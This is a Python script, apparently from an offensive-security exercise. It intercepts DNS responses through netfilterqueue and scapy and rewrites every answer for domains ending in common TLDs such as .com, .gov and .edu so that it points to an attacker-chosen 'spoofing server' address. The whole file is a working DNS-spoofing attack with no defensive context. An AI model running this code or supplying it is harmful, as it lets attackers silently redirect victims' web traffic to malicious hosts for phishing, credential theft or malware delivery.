#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import optparse

def argument():
    parser = optparse.OptionParser()
    parser.add_option("-a", "--add", dest="add", help="Enter the address of Spoofing server" )
    return parser.parse_args()

def get_add(add):
    return add

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         add = get_add(options.add)
         urls = [".org", ".com", ".in", ".edu", ".gov", ".ml"]
         for url in urls:
               if url in qname:
                    ans_packet = scapy.DNSRR(rrname=qname, rdata=add)
                    scapy_packet[scapy.DNS].an = ans_packet
                    scapy_packet[scapy.DNS].ancount = 1

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(str(scapy_packet))

    packet.accept()

(options, argument) = argument()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Execution Ended")